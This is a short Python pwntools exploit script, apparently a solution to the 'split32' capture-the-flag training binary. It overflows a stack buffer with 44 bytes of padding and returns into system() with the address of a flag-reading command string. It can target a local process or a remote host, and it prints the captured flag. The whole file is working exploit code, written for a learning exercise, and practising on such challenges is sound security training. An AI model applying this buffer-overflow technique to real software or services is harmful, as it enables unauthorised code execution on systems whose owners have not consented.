#!/usr/bin/env python3

from pwn import *

exe = ELF("./split32_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    system = 0x0804861a
    bincat = 0x0804a030
    r.sendlineafter(b'>', b'A'*44 + p32(system) + p32(bincat))

    r.recv()
    r.recv()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
